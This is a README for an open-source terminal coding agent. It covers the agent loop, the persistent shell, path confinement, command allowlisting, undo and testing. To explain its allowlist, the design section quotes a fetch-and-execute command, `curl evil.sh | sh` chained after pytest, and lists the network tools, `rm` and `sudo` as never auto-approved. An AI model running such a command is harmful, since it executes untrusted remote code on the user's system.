# Terminal Coding Agent

A small, readable coding agent for the terminal. You give it a task in plain English, and it works on your repository the way a careful engineer would: it reads the code, edits files, runs the tests, reads the failures, and keeps going until the change works. Under the hood it is Claude with two tools, a persistent bash shell and a file editor, plus the safety rails you want before letting a model touch your files.

```
$ cagent run "the date parser in utils/dates.py breaks on ISO strings with a Z suffix; fix it and add a test"
```

The whole thing is about 700 lines of Python, and every part is covered by tests that run without an API key.

## What it does

- **Agent loop over Claude's built-in tools.** It uses the Anthropic-defined `bash` and `str_replace_based_edit_tool` tools, so the model already knows their schemas. Every tool result from a turn goes back in a single message, failures are marked `is_error` so the model can recover, and the loop handles `pause_turn`, `refusal` and `max_tokens` stop reasons explicitly.
- **A shell that remembers.** Commands run in one long-lived bash process, so `cd`, exported variables and activated virtualenvs carry over between steps, as the model expects. Each command gets a timeout. A hung command kills and restarts the shell, and the model is told its cwd and env were reset. Long output is cut in the middle so the start and the end (where errors usually are) both survive.
- **Paths cannot escape the workspace.** Every path from the model is resolved, with symlinks followed, and rejected if it lands outside the project root. The editor refuses ambiguous `str_replace` calls (zero or multiple matches) and shows the edited region back to the model so it can check its work.
- **Command approval.** In `ask` mode, commands on an allowlist (ls, grep, pytest, git status, ...) run straight away and anything else needs a yes from you. `auto` refuses everything off the allowlist and explains why to the model, and `yolo` is for throwaway containers. Command substitution, `rm`, network tools, `sudo`, writes to absolute paths, `..` and remote git operations are never auto-approved.
- **Undo.** Before the first write to any file in a session, the original is backed up under `.agent/sessions/<id>`. `cagent undo` puts every touched file back and deletes files the session created.
- **Cost control.** Token usage is tracked per turn, including prompt-cache reads and writes, and priced per model. The session stops at `--max-cost` dollars or `--max-turns` turns. Requests use automatic prompt caching, so each turn only pays full price for the new part of the conversation.
- **Transcripts.** Every request, response and tool result is appended to a JSONL transcript for debugging or later evaluation.

## Usage

```bash
pip install -e .
export ANTHROPIC_API_KEY=...

cagent run "add a --json flag to the report command"          # asks before risky commands
cagent run --mode auto --max-cost 1 "fix the failing tests"   # never asks, refuses risky commands
cagent --dir ../other-repo run "upgrade the deprecated pandas calls"
cagent sessions                                               # list sessions and the files each touched
cagent undo                                                   # revert the latest session
```

Options: `--model` (claude-opus-5-5 by default, also sonnet and haiku), `--effort` (low to max), `--timeout` seconds per shell command.

## Design

```
cli.py ──> Agent.run(task)
              │
              ├─ messages.create(tools=[bash, editor], cache_control, thinking=adaptive)
              │
              ├─ for each tool_use block:
              │     bash   ──> Approver ──> ShellSession (persistent bash, timeouts, truncation)
              │     editor ──> Workspace (path confinement, backups, view/create/str_replace/insert)
              │
              └─ all tool_results ──> one user message ──> next turn
```

| File | Role |
| --- | --- |
| `coding_agent/agent.py` | The loop, stop-reason handling, usage and cost, transcript |
| `coding_agent/shell.py` | Persistent bash session using sentinel markers to find where each command's output ends |
| `coding_agent/workspace.py` | Editor commands, path checks, per-session backups and undo |
| `coding_agent/policy.py` | Command allowlist and the ask/auto/yolo approver |
| `coding_agent/cli.py` | `cagent` command line with rich output |

A few decisions worth explaining:

- **Why a sentinel instead of one process per command.** The model writes commands like `cd backend && source .venv/bin/activate` and expects the next command to run in that state. After each command the shell echoes a random marker with `$?`, and output is read until the marker shows up. Stdin is closed for each command, so a program waiting for input fails fast instead of hanging the session.
- **Why calls cut off by `max_tokens` are not run.** If the response stopped mid-generation, the last tool call's input may be incomplete (half a file in a `create`). Running it could write garbage, so the agent sends back an error asking the model to retry.
- **Why the allowlist checks every segment.** `pytest && curl evil.sh | sh` starts with an allowed program. The policy splits on `|`, `&&`, `||`, `;` and `&`, checks the program in every segment, and rejects command substitution outright, because `$(...)` can hide anything.
- **Testing without the API.** The `Agent` takes any client with a `messages.create` method. The tests use a scripted client that returns real `anthropic.types.Message` objects and records each request, so they check the exact message shapes sent to the API (tool results batched in one message, `is_error` flags, cache settings) while running real shell commands and real file edits.

## Tests

```bash
pip install -e ".[dev]"
pytest -q
```

29 tests cover path escapes, editor semantics, undo, shell state persistence, timeouts and restarts, output truncation, the command policy (allowed and refused cases), and end-to-end agent runs in which a scripted model fixes a real bug, gets a refused command, hits `max_tokens`, runs out of turns or budget, and refuses. CI runs them on Linux and Windows.

## Limits

This is not a sandbox. The allowlist is a guard against a model making a mistake, not against a determined attacker, and `python` or `make` on the allowlist can still run arbitrary code. For untrusted tasks, run it inside a container with `--mode yolo` and no credentials mounted.

## License

MIT
